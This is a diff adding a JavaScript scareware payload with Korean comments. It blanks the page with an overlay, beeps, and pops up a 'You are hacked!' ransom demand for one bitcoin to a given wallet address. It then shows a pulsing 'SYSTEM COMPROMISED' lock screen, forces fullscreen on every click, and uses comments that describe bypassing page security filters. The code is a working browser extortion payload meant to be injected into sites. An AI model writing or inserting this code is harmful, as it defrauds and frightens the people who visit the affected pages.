@@ -1,0 +1,111 @@
+// 1. 현재 화면 전체를 하얀색으로 가득 채우는 오버레이를 만듭니다
+const overlay = document.createElement('div');
+overlay.style.position = 'fixed';
+overlay.style.top = '0';
+overlay.style.left = '0';
+overlay.style.width = '100vw';
+overlay.style.height = '100vh';
+overlay.style.backgroundColor = '#ffffff';
+overlay.style.zIndex = '999999';
+document.body.appendChild(overlay);
+
+// 2. 삐삐삐 소리를 5번 재생합니다.
+try {
+    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    for (let i = 0; i < 5; i++) {
+        setTimeout(() => {
+            const oscillator = audioCtx.createOscillator();
+            const gainNode = audioCtx.createGain();
+           
+            oscillator.type = 'sine';
+            oscillator.frequency.setValueAtTime(800, audioCtx.currentTime);
+           
+            oscillator.connect(gainNode);
+            gainNode.connect(audioCtx.destination);
+           
+            oscillator.start();
+            oscillator.stop(audioCtx.currentTime + 0.15);
+        }, i * 300);
+    }
+} catch (e) {
+    console.log("오디오 재생 실패:", e);
+}
+
+// 3. 소리가 다 울린 후(약 1초 뒤) 알림창 띄우기
+setTimeout(() => {
+    alert("You are hacked! send one bitcoin to 1J7mdg5rbQyUHENYdx39WVWK7fsLpEoXZy (ransomware)");
+   
+    setTimeout(() => {
+        // 배경을 완전한 검은색으로 전환
+        overlay.style.backgroundColor = '#000000';
+       
+        // [보안 우회] innerHTML을 전혀 쓰지 않고 모든 요소를 DOM 객체로 직접 생성
+        const container = document.createElement('div');
+        container.style.display = 'flex';
+        container.style.flexDirection = 'column';
+        container.style.justifyContent = 'center';
+        container.style.alignItems = 'center';
+        container.style.width = '100%';
+        container.style.height = '100%';
+        container.style.color = '#ff0000';
+        container.style.fontFamily = 'monospace';
+
+        // ⚠ 경고 아이콘 생성 및 초기 스타일 부여
+        const iconDiv = document.createElement('div');
+        iconDiv.textContent = '⚠';
+        iconDiv.style.fontSize = '20vw';
+        iconDiv.style.lineHeight = '1';
+        iconDiv.style.color = '#ff0000';
+        iconDiv.style.transition = 'transform 0.5s ease-in-out, opacity 0.5s ease-in-out, text-shadow 0.5s ease-in-out';
+        iconDiv.style.textShadow = '0 0 20px #ff0000';
+        iconDiv.style.userSelect = 'none';
+
+        // SYSTEM COMPROMISED 텍스트 생성 및 스타일 부여
+        const textDiv = document.createElement('div');
+        textDiv.textContent = 'SYSTEM COMPROMISED';
+        textDiv.style.fontSize = '2.5vw';
+        textDiv.style.marginTop = '30px';
+        textDiv.style.fontWeight = 'bold';
+        textDiv.style.letterSpacing = '2px';
+        textDiv.style.textShadow = '0 0 10px #ff0000';
+
+        // 구조 조립 후 화면에 부착
+        container.appendChild(iconDiv);
+        container.appendChild(textDiv);
+        overlay.appendChild(container);
+
+        // [CSS 무력화 우회] CSS 앳키프레임(@keyframes) 대신 자바스크립트 타이머로 애니메이션 직접 구현
+        let isPulse = false;
+        setInterval(() => {
+            if (!isPulse) {
+                iconDiv.style.transform = 'scale(1.1)';
+                iconDiv.style.opacity = '0.4';
+                iconDiv.style.textShadow = '0 0 40px #ff3333';
+            } else {
+                iconDiv.style.transform = 'scale(1)';
+                iconDiv.style.opacity = '1';
+                iconDiv.style.textShadow = '0 0 20px #ff0000';
+            }
+            isPulse = !isPulse;
+        }, 500); // 0.5초 간격으로 깜빡임 전환
+       
+        // --- 맨 마지막 전체화면 전환 로직 ---
+        const enterFullscreen = () => {
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen().catch(e => console.log("전체화면 자동 전환 차단됨 (클릭 필요):", e));
+            } else if (elem.webkitRequestFullscreen) { // Safari
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) { // IE11
+                elem.msRequestFullscreen();
+            }
+        };
+
+        // 1. 자동으로 전체화면 시도
+        enterFullscreen();
+       
+        // 2. 브라우저가 자동 전환을 막았을 경우를 대비해 화면 클릭 시 전체화면으로 전환되도록 설정
+        overlay.addEventListener('click', enterFullscreen);
+
+    }, 0);
+}, 1000);
